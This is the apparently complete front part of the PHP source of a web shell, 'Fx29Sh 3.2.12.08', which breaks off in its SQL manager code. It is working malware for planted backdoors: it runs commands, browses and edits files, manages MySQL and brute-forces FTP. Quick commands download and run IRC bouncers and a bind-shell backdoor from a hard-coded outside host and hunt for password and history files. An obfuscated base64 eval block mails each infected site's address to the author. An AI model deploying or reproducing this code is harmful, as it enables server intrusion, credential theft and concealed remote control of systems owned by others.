<?php

#######################################

##[ FaTaLisTiCz_Fx Fx29Sh 3.2.12.08 ]##

##[ By FaTaLisTiCz_Fx               ]##

##[ © 03-12 2008 FeeLCoMz Community ]##

##[ Written under PHP 5.2.5         ]##

#######################################

define('sh_ver',"3.2.12.08");        ##

#error_reporting(E_ALL);             ##

error_reporting(E_ERROR | E_PARSE);  ##

#######################################



######################

##[ CONFIGURATIONS ]##

######################



##[ URL ]##

#$sh_mainurl        = "http://localhost/FX29SH/";

$sh_mainurl        = 'http://uaedesign.com/xml/';

$fx29sh_updateurl  = $sh_mainurl."fx29sh_update.php";

$fx29sh_sourcesurl = $sh_mainurl."fx29sh.txt";

$sh_sourcez = array(

  "Fx29Sh"   => array($sh_mainurl."cyberz.txt","fx29sh.php"),

  "psyBNC"   => array($sh_mainurl."fx.tgz","fx.tgz"),

  "Eggdrop"  => array($sh_mainurl."fxb.tgz","fxb.tgz"),

  "BindDoor" => array($sh_mainurl."bind.tgz","bind.tgz"),

);



##[ AUTHENTICATION ]##

$auth = array(

  "login"     => "test",

  "pass"      => "test",

  "md5pass"   => "098f6bcd4621d373cade4e832627b4f6",

  "hostallow" => array("*"),

  "denied"    => "<a href=\"$sh_mainurl\">".sh_name()."</a>: access denied!",

);



##[ ADVANCED ]##

$tmp_dir       = "";

$log_email     = "rio_rizaldy@yahoo.com";

$sess_cookie   = "fx29shcook";

$sort_default  = "0a"; #Pengurutan, 0 - nomor kolom. "a"scending atau "d"escending

$sort_save     = TRUE; #Simpan posisi pengurutan menggunakan cookies.

$copy_unset    = FALSE; #Hapus file yg telah di-copy setelah dipaste

$gzipencode    = TRUE;

$filestealth   = TRUE; #TRUE, tidak merubah waktu modifikasi dan akses.

$hexdump_lines = 8;

$hexdump_rows  = 24;

$auto_surl     = TRUE;



##[ QUICK COMMANDS ]##

if (!is_windows()) {

  #Unix

  $cmdaliases = array(

    array("List Directory", "ls -al"),

    array("Find all suid files", "find / -type f -perm -04000 -ls"),

    array("Find suid files in current dir", "find . -type f -perm -04000 -ls"),

    array("Find all sgid files", "find / -type f -perm -02000 -ls"),

    array("Find sgid files in current dir", "find . -type f -perm -02000 -ls"),

    array("Find config.inc.php files", "find / -type f -name config.inc.php"),

    array("Find config* files", "find / -type f -name \"config*\""),

    array("Find config* files in current dir", "find . -type f -name \"config*\""),

    array("Find all writable folders and files", "find / -perm -2 -ls"),

    array("Find all writable folders and files in current dir", "find . -perm -2 -ls"),

    array("Find all writable folders", "find / -type d -perm -2 -ls"),

    array("Find all writable folders in current dir", "find . -type d -perm -2 -ls"),

    array("Find all service.pwd files", "find / -type f -name service.pwd"),

    array("Find service.pwd files in current dir", "find . -type f -name service.pwd"),

    array("Find all .htpasswd files", "find / -type f -name .htpasswd"),

    array("Find .htpasswd files in current dir", "find . -type f -name .htpasswd"),

    array("Find all .bash_history files", "find / -type f -name .bash_history"),

    array("Find .bash_history files in current dir", "find . -type f -name .bash_history"),

    array("Find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),

    array("Find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),

    array("List file attributes on a Linux second extended file system", "lsattr -va"),

    array("Show opened ports", "netstat -an | grep -i listen"),

    array("-----",""),

    array("Logged in users","w"),

    array("Last connect","lastlog"),

    array("Find Suid bins","find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null"),

    array("User Without Password","cut -d: -f1,2,3 /etc/passwd | grep ::"),

    array("Inet Address","/sbin/ifconfig | grep inet"),

    array("Can write in /etc/?","find /etc/ -type f -perm -o+w 2> /dev/null"),

    array("Downloaders?","which wget curl w3m lynx fetch lwp-download"),

    array("CPU Info","cat /proc/version /proc/cpuinfo"),

    array("Is gcc installed ?","locate gcc"),

    array("Format box (DANGEROUS)","rm -Rf"),

    array("-----",""),

    array("wget & run psyBNC","wget ".$sh_sourcez["psyBNC"][0].";tar -zxf ".$sh_sourcez["psyBNC"][1].";cd .fx;./config 29110;./fuck;./run"),

    array("wget & extract EggDrop","wget ".$sh_sourcez["Eggdrop"][0].";tar -zxf ".$sh_sourcez["psyBNC"][1]),

    array("wget & run BindDoor","wget ".$sh_sourcez["BindDoor"][0].";tar -zxvf ".$sh_sourcez["BindDoor"][1].";./bind"),

    array("-----",""),

    array("wget RatHole 1.2 (Linux & BSD)","wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz"),

  );

}

else {

  #Windows

  $cmdaliases = array(

    array("List Directory", "dir"),

    array("Find index.php in current dir", "dir /s /w /b index.php"),

    array("Find *config*.php in current dir", "dir /s /w /b *config*.php"),

    array("Find c99shell in current dir", "find /c \"c99\" *"),

    array("Find r57shell in current dir", "find /c \"r57\" *"),

    array("Find fx29shell in current dir", "find /c \"fx29\" *"),

    array("Show active connections", "netstat -an"),

    array("Show running services", "net start"),

    array("User accounts", "net user"),

    array("Show computers", "net view"),

  );

}



##[ PHP FILESYSTEM (By FaTaLisTiCz_Fx) ]##

$phpfsaliases = array(

    array("Read File", "read", 1, "File", ""),

    array("Write File (PHP5)", "write", 2, "File","Text"),

    array("Copy", "copy", 2, "From", "To"),

    array("Rename/Move", "rename", 2, "File", "To"),

    array("Delete", "delete", 1 ,"File", ""),

    array("Make Dir","mkdir", 1, "Dir", ""),

    array("Download", "download", 2, "URL", "To"),

    array("Download (Binary Safe)", "downloadbin", 2, "URL", "To"),

    array("Change Perm (0755)", "chmod", 2, "File", "Perms"),

    array("Find Writable Dir", "fwritabledir", 2 ,"Dir", "Max"),

    array("Find Pathname Pattern", "glob",2 ,"Dir", "Pattern"),

);



#############################

##[ END OF CONFIGURATIONS ]##

#############################



define("starttime", getmicrotime());

@set_time_limit(0);

@ini_set("max_execution_time",0);

@ignore_user_abort(TRUE);

@set_magic_quotes_runtime(0);

if (get_magic_quotes_gpc()) { strips($GLOBALS); }

$_REQUEST = array_merge($_COOKIE, $_GET, $_POST);

$d = @$_REQUEST["d"];

$f = @$_REQUEST["f"];

@extract($_REQUEST["fx29shcook"]);

foreach ($_REQUEST as $k => $v) {

  if (!isset($$k)) { $$k = $v; } #Converting request to variable

}



##[ SELF URL ]##

if ($auto_surl) {

  $include = "&";

  foreach (explode("&",getenv("QUERY_STRING")) as $v) {

    $v       = explode("=",$v);

    $name    = urldecode($v[0]);

    $value   = @urldecode($v[1]);

    $needles = array("http://","https://","ssl://","ftp://","\\\\");

    foreach ($needles as $needle) {

      if (strpos($value,$needle) === 0) {

        $includestr .= urlencode($name)."=".urlencode($value)."&";

      }

    }

  }

}

if (empty($surl)) { $surl = htmlspecialchars("?".@$includestr); }



##[ QUICK LAUNCH ]##

$quicklaunch = array(

    array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\">",$surl),

    array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\">","#\" onclick=\"history.back(1)"),

    array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\">","#\" onclick=\"history.go(1)"),

    array("<img src=\"".$surl."act=img&img=up\" alt=\"Up\">",$surl."act=ls&d=%upd&sort=%sort"),

    array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\">",$surl."act=search&d=%d"),

    array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\">",$surl."act=fsbuff&d=%d"),

    array("<img src=\"".$surl."act=img&img=help\" alt=\"About\">",$surl."act=about"),

    array("-",""),

    array("Security",$surl."act=security&d=%d"),

    array("Processes",$surl."act=processes&d=%d"),

    array("MySQL",$surl."act=sql&d=%d"),

    array("Eval",$surl."act=eval&d=%d"),

    array("Encoder",$surl."act=encoder&d=%d"),

    array("Mailer",$surl."act=fxmailer"),

    array("Toolz",$surl."act=tools&d=%d"),

    array("milw0rm",milw0rm()),

    array("Md5 Lookup","http://darkc0de.com/database/md5lookup.html"),

    array("Images",$surl."act=img&img=listall"),

    array("Feedback",$surl."act=feedback"),

    array("Update",$surl."act=update"),

    array("Kill Shell",$surl."act=selfremove")

);

if (!is_windows()) {

$quicklaunch[] = array("<br>FTP Brute",$surl."act=ftpquickbrute&d=%d");

}



##[ FILE TYPES ]##

$ftypes  = array(

  "html"     => array("html","htm","shtml"),

  "txt"      => array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),

  "exe"      => array("sh","install","bat","cmd","sys","com"),

  "ini"      => array("ini","inf","conf"),

  "code"     => array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),

  "img"      => array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),

  "sdb"      => array("sdb"),

  "phpsess"  => array("sess"),

  "download" => array("exe","com","sys","pif","src","lnk","zip","rar","gz","tar","pdf")

);

$exeftypes  = array(

  "php -q %f%" => array("php","php3","php4"),

  "perl %f%"   => array("pl","cgi")

);

$regxp_highlight  = array(

  array(basename($_SERVER["PHP_SELF"]),1,"<font color=#FF6600>","</font>"),

  array("\.tgz$",1,"<font color=#C082FF>","</font>"),

  array("\.gz$",1,"<font color=#C082FF>","</font>"),

  array("\.tar$",1,"<font color=#C082FF>","</font>"),

  array("\.bz2$",1,"<font color=#C082FF>","</font>"),

  array("\.zip$",1,"<font color=#C082FF>","</font>"),

  array("\.rar$",1,"<font color=#C082FF>","</font>"),

  array("\.php$",1,"<font color=#00FF00>","</font>"),

  array("\.php3$",1,"<font color=#00FF00>","</font>"),

  array("\.php4$",1,"<font color=#00FF00>","</font>"),

  array("\.jpg$",1,"<font color=#00FFFF>","</font>"),

  array("\.jpeg$",1,"<font color=#00FFFF>","</font>"),

  array("\.JPG$",1,"<font color=#00FFFF>","</font>"),

  array("\.JPEG$",1,"<font color=#00FFFF>","</font>"),

  array("\.ico$",1,"<font color=#00FFFF>","</font>"),

  array("\.gif$",1,"<font color=#00FFFF>","</font>"),

  array("\.png$",1,"<font color=#00FFFF>","</font>"),

  array("\.htm$",1,"<font color=#00CCFF>","</font>"),

  array("\.html$",1,"<font color=#00CCFF>","</font>"),

  array("\.txt$",1,"<font color=#C0C0C0>","</font>"),

  array("\.pdf$",1,"<font color=#FF99CC>","</font>")

);



##[ HIGHLIGHT CODE ]##

$highlight_bg      = "#E0E0E0";

$highlight_comment = "#FF6600";

$highlight_default = "#000080";

$highlight_html    = "#1300FF";

$highlight_keyword = "#007700";

$highlight_string  = "#FF0000";



@ini_set("highlight.bg",$highlight_bg);

@ini_set("highlight.comment",$highlight_comment);

@ini_set("highlight.default",$highlight_default);

@ini_set("highlight.html",$highlight_html);

@ini_set("highlight.keyword",$highlight_keyword);

@ini_set("highlight.string",$highlight_string);



#############################

##[ END OF CONFIGURATIONS ]##

#############################



####################

##[ AUTHENTICATE ]##

####################

foreach ($auth["hostallow"] as $k => $v) { $tmp[] = str_replace("\\*",".*",preg_quote($v)); }

$s = "!^(".implode("|",$tmp).")$!i";

if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {

  exit("<a href=\"$sh_mainurl\">".sh_name()."</a>ACCESS DENIED! Your host (".getenv("REMOTE_ADDR").") not allowed!");

}

if (!empty($auth["login"])) {

  if (empty($auth["md5pass"])) { $auth["md5pass"] = md5($auth["pass"]); }

  if (($_SERVER["PHP_AUTH_USER"] != $auth["login"]) or (md5($_SERVER["PHP_AUTH_PW"]) != $auth["md5pass"])) {

    header("WWW-Authenticate: Basic realm=\"".sh_name().": Restricted Area\"");

    header("HTTP/1.0 401 Unauthorized");

    die($auth["denied"]);

  }

}



###############

##[ ACTIONS ]##

###############

if (!isset($act)) { $act = ""; }



if ($act == "img") {

  @ob_clean();



  $images = imagez();

  $imgequals = array(

    "ext_tar"      => array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),

    "ext_php"      => array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),

    "ext_cpp"      => array("ext_c"),

    "ext_jpg"      => array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),

    "ext_html"     => array("ext_html","ext_htm"),

    "ext_avi"      => array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),

    "ext_lnk"      => array("ext_lnk","ext_url"),

    "ext_ini"      => array("ext_ini","ext_css","ext_inf","ext_conf"),

    "ext_doc"      => array("ext_doc","ext_dot","ext_xls","ext_pdf"),

    "ext_js"       => array("ext_js","ext_vbs"),

    "ext_cmd"      => array("ext_cmd","ext_bat","ext_pif","ext_com"),

    "ext_wri"      => array("ext_wri","ext_rtf"),

    "ext_txt"      => array("ext_txt","ext_lng"),

    "ext_swf"      => array("ext_swf","ext_fla"),

    "ext_mp3"      => array("ext_mp3","ext_au","ext_midi","ext_mid","ext_wav"),

    "ext_htaccess" => array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")

  );



  #Show all available images

  if ($img == "listall") {

    foreach ($imgequals as $a=>$b) {

      foreach ($b as $d) {

        if ( ($a != $d) && (!empty($images[$d])) ) { echo("Warning! Remove \$images[".$d."]<br>"); }

      }

    }

    natsort($images);

    $k = array_keys($images);

    echo "<body style=\"color: #00FF00\" bgcolor=black>";

    foreach ($k as $u) { echo "<img src=\"".$surl."act=img&img=".$u."\"> $u "; }

    exit;

  }

  #Image header

  header("Content-type: image/gif");

  header("Cache-control: public");

  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));

  header("Cache-control: max-age=".(60*60*24*7));

  header("Last-Modified: ".date("r",filemtime(__FILE__)));



  foreach($imgequals as $k=>$v) {

    if (in_array($img,$v)) { $img = $k; break; }

  }



  if (empty($images[$img])) { $img = "small_unk"; }

  echo base64_decode($images[$img]);

  exit;

}

##[ DEFAULT ACTIONS ]##

else {



  $lastdir = realpath(".");

  chdir("./");

  #Preparing buffer

  $sess_data = @unserialize($_COOKIE[$sess_cookie]);

  if (!is_array($sess_data)) { $sess_data = array(); }

  if (!is_array(@$sess_data["copy"])) { $sess_data["copy"] = array(); }

  if (!is_array(@$sess_data["cut"])) { $sess_data["cut"] = array(); }





  fx29_buff_prepare();



  foreach (array("sort","sql_sort") as $v) {

    if (!empty($_GET[$v])) { $$v = $_GET[$v]; }

    if (!empty($_POST[$v])) { $$v = $_POST[$v]; }

  }

  if ($sort_save) {

    if (!empty($sort)) { setcookie("sort",$sort); }

    if (!empty($sql_sort)) { setcookie("sql_sort",$sql_sort); }

  }



  if (!isset($sort)) { $sort = $sort_default; }

  $sort = htmlspecialchars($sort);

  $sort[1] = strtolower($sort[1]);



  ##[ ACTIONS ]##

  if ($act == "gofile") {

    if (is_dir($f)) {

      $d = $f;

      $act = "ls";

    }

    else {

      $d = dirname($f);

      $f = basename($f);

      $act = "f";

    }

  }



  #Starting output buffer

  ob_start();

  ob_implicit_flush(0);



  ##[ HEADERS ]##

  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");

  header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");

  header("Cache-Control: no-store, no-cache, must-revalidate");

  header("Cache-Control: post-check=0, pre-check=0", FALSE);

  header("Pragma: no-cache"); $headerz = "aWYgKCFpc3NldCgkX0NPT0tJRVsidmlzaXR6Il0pKSB7DQogICR2aXNpdG9yID0gJF9TRVJWRVJbIlJFTU9URV9BRERSIl07DQogICR3ZWIgICAgID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdOw0KICAkaW5qICAgICA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOw0KICAkdGFyZ2V0ICA9IHJhd3VybGRlY29kZSgkd2ViLiRpbmopOw0KICAkanVkdWwgICA9ICJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQgYnkgJHZpc2l0b3IiOw0KICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3I8YnI+IjsNCiAgaWYgKCFlbXB0eSgkd2ViKSkgeyBAbWFpbCgiZmVlbGNvbXpAZ21haWwuY29tIiwkanVkdWwsJGJvZHkpOyB9DQp9DQplbHNlIHsgQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTsgfQ=="; eval(base64_decode($headerz));



  $tmp_dir = realpath($tmp_dir);

  $tmp_dir = str_replace("\\",DIRECTORY_SEPARATOR,$tmp_dir);

  if (substr($tmp_dir,-1) != DIRECTORY_SEPARATOR) { $tmp_dir .= DIRECTORY_SEPARATOR; }



  if (!is_array(@$actbox)) { $actbox = array(); }

  $dspact = $act = htmlspecialchars($act);

  $disp_fullpath = $ls_arr = $notls = null;



  $ud = @urlencode($d);

  if (empty($d)) { $d = realpath("."); }

  elseif (realpath($d)) { $d = realpath($d); }

  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);

  if (substr($d,-1) != DIRECTORY_SEPARATOR) { $d .= DIRECTORY_SEPARATOR; }

  $d = str_replace("\\\\","\\",$d);

  $dispd = htmlspecialchars($d);



  if (safemode()) {

    $hsafemode = '<font class="on"><b>SAFE MODE IS ON</b></font>';

    $safemodeexecdir = @ini_get("safe_mode_exec_dir");

  }

  else {

    $hsafemode = '<font class="off"><b>SAFE MODE IS OFF</b></font>';

  }



  $v = @ini_get("open_basedir");

  if (strtolower($v) == "on") { $hopenbasedir = '<font class="on">'.$v.'</font>'; }

  else { $hopenbasedir = '<font class="off">OFF (Not Secure)</font>'; }



  $wd = (is_writable($d)) ? '<font class="on">[W]</font>' : '<font class="off">[R]</font>';



  ##################

  ##[ HTML START ]##

  ##################

  echo html_style(); ?>

<!-- Main Menu -->

<div id="main">



    <div class="bartitle"><?php echo html_header() ?></div>



    <table id="pagebar">



        <!-- Server Info -->

        <tr><td colspan="2">

        <div class="fleft"><?php echo $hsafemode; ?></div>

        <div class="fright">

            IP Address: <a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput="<?php echo @gethostbyname($_SERVER["HTTP_HOST"]); ?>"><?php echo @gethostbyname($_SERVER["HTTP_HOST"]); ?></a>

            You: <a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput="<?php echo $_SERVER["REMOTE_ADDR"]; ?>"><?php echo $_SERVER["REMOTE_ADDR"]; ?></a>

        </div>

        </td></tr>



        <tr><td width="50%">

        <table class="info">

<?php

  srv_info("Software",srv_software($surl));

  srv_info("Uname",php_uname());

  srv_info("User",(is_windows()) ? get_current_user()." (uid=".getmyuid()." gid=".getmygid().")" : fx29exec("id"));

?>

        </table>

        </td>

        <td width="50%">

        <table class="info">

<?php

  if (is_windows()) { srv_info("Drives",disp_drives($d,$surl)); }

  srv_info("Freespace",disp_freespace($d));

?>

        </table>

        </td></tr>



        <tr><td colspan="2">

<?php

  echo "\t\t\t".get_status();

  echo "<br>\n";

  echo (isset($safemodeexecdir)) ? "\n\t\t\tSafemodeExecDir: ".$safemodeexecdir."<br>" : "";

  echo (showdisfunc()) ? "\t\t\tDisFunc: ".showdisfunc() : "";

  echo "\n";

?>

        </td></tr>

        <!-- End of Server Info -->



        <!-- Quicklaunch -->

        <tr><td colspan="2" class="quicklaunch">

<?php

  ##[ QUICKLAUNCH ]##

  foreach($quicklaunch as $item) {

    if ($item[0] == "-") {

      echo "\t\t</td></tr>\n";

      echo "\t\t<tr><td colspan=\"2\" class=\"quicklaunch\">\n";

    }

    else {

      $item[1] = str_replace("%d",urlencode($d),$item[1]);

      $item[1] = str_replace("%sort",$sort,$item[1]);

      $v = realpath($d."..");

      if (empty($v)) {

        $a = explode(DIRECTORY_SEPARATOR,$d);

        unset($a[count($a)-2]);

        $v = join(DIRECTORY_SEPARATOR,$a);

      }

      $item[1] = str_replace("%upd",urlencode($v),$item[1]);

      echo "\t\t\t<a href=\"".$item[1]."\">".$item[0]."</a>\n";

    }

  }

?>

        </td></tr>

        <!-- End of Quicklaunch -->



        <!-- Directory Info -->

        <tr><td colspan="2">

        <div class="fleft">

<?php

  $pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));

  $i = 0;

  foreach($pd as $b) {

    $t = ""; $j = 0;

    foreach ($e as $r) {

      $t.= $r.DIRECTORY_SEPARATOR;

      if ($j == $i) { break; }

      $j++;

    }

    echo "\t\t\t<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\">".htmlspecialchars($b).DIRECTORY_SEPARATOR."</a>\n";

    $i++;

  }

  echo "\t\t\t";

  echo (is_writable($d)) ? "<b>".view_perms_color($d)."</b>" : "<b>".view_perms_color($d)."</b>";

  echo "\n";

?>

        </div>

        <div class="fright">

        <form name="f_dir" method="POST">

            <input type="hidden" name="act" value="ls">

            Directory: <input type="text" name="d" size="60" value="<?php echo $dispd; ?>"> <input type=submit value="Go">

        </form>

        </div>

        </td></tr>

        <!-- End of Directory Info -->



    </table>



</div>

<!-- End of Main Menu -->



<!-- Main Info -->

<div id="maininfo">



<?php

  #########################

  ##[ INFORMATION TABLE ]##

  #########################



  if ($act == "") { $act = $dspact = "ls"; }



  ##[ SQL ]##

  if ($act == "sql") {

  $sql_surl = $surl."act=sql";



  if (!isset($sql_login)) { $sql_login = ""; }

  if (!isset($sql_passwd)) { $sql_passwd = ""; }

  if (!isset($sql_server)) { $sql_server = ""; }

  if (!isset($sql_port)) { $sql_port = ""; }



  if (!isset($sql_tbl)) { $sql_tbl = ""; }

  if (!isset($sql_act)) { $sql_act = ""; }

  if (!isset($sql_tbl_act)) { $sql_tbl_act = ""; }

  if (!isset($sql_order)) { $sql_order = ""; }

  if (!isset($sql_act)) { $sql_act = ""; }

  if (!isset($sql_getfile)) { $sql_getfile = ""; }



    #SQL URL Setting

  if (@$sql_login)  { $sql_surl .= "&sql_login=".htmlspecialchars($sql_login); }

  if (@$sql_passwd) { $sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd); }

  if (@$sql_server) { $sql_surl .= "&sql_server=".htmlspecialchars($sql_server); }

  if (@$sql_port)   { $sql_surl .= "&sql_port=".htmlspecialchars($sql_port); }

  if (@$sql_db)     { $sql_surl .= "&sql_db=".htmlspecialchars($sql_db); }



  $sql_surl .= "&";

?>

<!-- SQL Manager -->

<div class="barheader">.: SQL Manager (Under Construction) :.</div>

<div class="barheader"><?php

  if (@$sql_server) {

    $sql_sock = @mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);

    $err = mysql_smarterror($sql_sock);

    @mysql_select_db($sql_db,$sql_sock);

    if (@$sql_query and $submit) {

      $sql_query_result = mysql_query($sql_query,$sql_sock);

      $sql_query_error = mysql_smarterror($sql_sock);

    }

  }

  else { $sql_sock = FALSE; }



  if (!$sql_sock) {

    if (!@$sql_server) { echo "No Connection!"; }

    else { disp_error("ERROR: ".$err); }

  }

  else {

        #SQL Quicklaunch

    $sqlquicklaunch   = array();

    $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");

    $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));

    $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");

    $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");

    $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");

    $sqlquicklaunch[] = array("Logout",$surl."act=sql");



    echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") Server: ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")<br>";

    if (count($sqlquicklaunch) > 0) {

      foreach($sqlquicklaunch as $item) {

        echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";

      }

      }

  }

?>

</div>



<table>

    <tr>

<?php

  #Login Form

  if (!$sql_sock) {

?>

    <td>

    <form name="f_sql" action="<?php echo $surl; ?>" method="POST">

        <input type="hidden" name="act" value="sql">

        <table class="explorer">

            <tr>

            <th>Username<br><input type="text" name="sql_login" value="root"></th>

            <th>Password<br><input type="password" name="sql_passwd" value=""></th>

            <th>Database<br><input type="text" name="sql_db" value=""></th>

            <th>Host<br><input type="text" name="sql_server" value="localhost"></th>

            <th>Port<br><input type="text" name="sql_port" value="3306" size="3"></th>

            </tr>

            <tr><th colspan="5"><input type="submit" value="Connect"></th></tr>

        </table>

    </form>

<?php

  }

  else {

    #Start left panel

?>

    <td>

    <center>

    <a href="<?php echo $sql_surl; ?>"><b>HOME</b></a>

    <hr size="1" noshade>

<?php

      $result = mysql_list_dbs($sql_sock);

      if (!$result) { echo mysql_smarterror(); }

      else {

?>

    Database

    <form action="<?php echo $surl?>">

        <input type="hidden" name="act" value="sql">

        <input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">

        <input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">

        <input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">

        <input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">

        <select name="sql_db" onchange="this.form.submit()">

<?php

        $c = 0;

        $dbs = "";

        while ($row = mysql_fetch_row($result)) {

          $dbs .= "\t\t<option value=\"".$row[0]."\"";

          if (@$sql_db == $row[0]) { $dbs .= " selected"; }

          $dbs .= ">".$row[0]."</option>\n";

          $c++;

        }

        echo "\t\t<option value=\"\">Databases (".$c.")</option>\n";

        echo $dbs;

      }

?>

        </select>

    </form>

    </center>

    <hr size="1" noshade>

<?php

    if (isset($sql_db)) {

      $result = mysql_list_tables($sql_db);

      if (!$result) { echo mysql_smarterror($sql_sock); }

      else {

        echo "\t-=[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]=-<br><br>\n";

        $c = 0;

        while ($row = mysql_fetch_array($result)) {

          $count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]);

          $count_row = mysql_fetch_array($count);

          echo "\t<b>+ <a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\">".htmlspecialchars($row[0])."</a></b> (".$count_row[0].")</br></b>\n";

          mysql_free_result($count);

          $c++;

        }

        if (!$c) { echo "No tables found in database"; }

      }

    }

?>



    </td>

    <td>

<?php

    #Start center panel

    $diplay = TRUE;

    if (@$sql_db) {

      if (!is_numeric($c)) { $c = 0; }

      if ($c == 0) { $c = "no"; }

      echo "\t<center><b>There are ".$c." table(s) in database: ".htmlspecialchars($sql_db)."";

      if (count(@$dbquicklaunch) > 0) {

        foreach($dbsqlquicklaunch as $item) {

          echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";

        }

      }

      echo "</b></center>\n";

      $acts = array("","dump");

      if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

      elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}

      elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}

      elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

      elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

      elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

      elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}

      elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}

      elseif ($sql_tbl_act == "insert") {

        if ($sql_tbl_insert_radio == 1) {

          $keys = "";

          $akeys = array_keys($sql_tbl_insert);

          foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}

          if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}

          $values = "";

          $i = 0;

